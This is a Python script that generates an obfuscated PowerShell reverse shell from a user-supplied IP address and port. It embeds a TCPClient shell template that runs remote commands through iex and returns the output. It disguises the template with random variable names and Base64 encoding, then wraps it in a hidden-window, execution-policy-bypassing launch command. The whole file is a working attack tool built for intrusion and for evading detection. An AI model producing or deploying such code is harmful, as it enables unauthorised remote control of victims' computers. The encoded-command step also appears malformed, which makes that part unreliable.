import random
import string
import base64

# Function to generate random variable names
def random_variable_name(size=6):
    return ''.join(random.choice(string.ascii_letters) for _ in range(size))

# Function to encode a PowerShell script to Base64
def encode_to_base64(script):
    encoded_bytes = base64.b64encode(script.encode('utf-16le'))
    ps_decode = f"$data=[System.Convert]::FromBase64String('{encoded_bytes.decode()}');"
    ps_decode += f"$decoded=[System.Text.Encoding]::Unicode.GetString($data);"
    ps_decode += f"iex $decoded"
    return ps_decode

# Function for basic obfuscation with random variable names
def basic_obfuscation(script):
    variables = {f"var{i}": random_variable_name() for i in range(1, 9)}
    for key, value in variables.items():
        script = script.replace(key, value)
    return script

# Function to apply mixed obfuscation techniques
def mixed_obfuscation(script):
    # Apply basic obfuscation first
    obfuscated_script = basic_obfuscation(script)
    # Then encode the result with Base64
    return encode_to_base64(obfuscated_script)

# PowerShell script template
ps_script_template = """
$var1 = New-Object System.Net.Sockets.TCPClient('IP_ADDRESS',PORT_NUMBER);
$var2 = $var1.GetStream();
[byte[]]$var3 = 0..65535|%{{0}};
while(($var4 = $var2.Read($var3, 0, $var3.Length)) -ne 0){{
    $var5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($var3,0,$var4);
    $var6 = iex $var5 2>&1 | Out-String;
    $var7 = $var6 + 'PS ' + (Get-Location).Path + '> ';
    $var8 = ([text.encoding]::ASCII).GetBytes($var7);
    $var2.Write($var8,0,$var8.Length);
    $var2.Flush();
}}
$var1.Close();
"""

# Function to create the PowerShell bypass execution policy command
def create_bypass_command(script):
    bypass_script = f"Start-Process $PSHOME\\powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand {script}'"
    return bypass_script

# Interactive CLI menu for obfuscation mode selection
def select_obfuscation_mode():
    print("Select the obfuscation technique:")
    print("1 - Basic")
    print("2 - Base64")
    print("3 - Mixed")
    choice = input("Enter your choice (1/2/3): ").strip()
    return choice

# Main function
def main():
    obfuscation_choice = select_obfuscation_mode()
    ip_address = input("Enter the IP address: ").strip()
    port_number = input("Enter the port number: ").strip()

    # Replace placeholders with actual IP address and port number
    script_with_ip_port = ps_script_template.replace('IP_ADDRESS', ip_address).replace('PORT_NUMBER', port_number)

    # Apply the chosen obfuscation technique
    if obfuscation_choice == '1':
        obfuscated_script = basic_obfuscation(script_with_ip_port)
    elif obfuscation_choice == '2':
        obfuscated_script = encode_to_base64(script_with_ip_port)
    elif obfuscation_choice == '3':
        obfuscated_script = mixed_obfuscation(script_with_ip_port)
    else:
        print("Invalid choice. Exiting.")
        return

    # Create the bypass command
    bypass_command = create_bypass_command(obfuscated_script)

    # Output the obfuscated script
    print("\nObfuscated PowerShell script with bypass execution policy:")
    print(bypass_command)

if __name__ == "__main__":
    main()
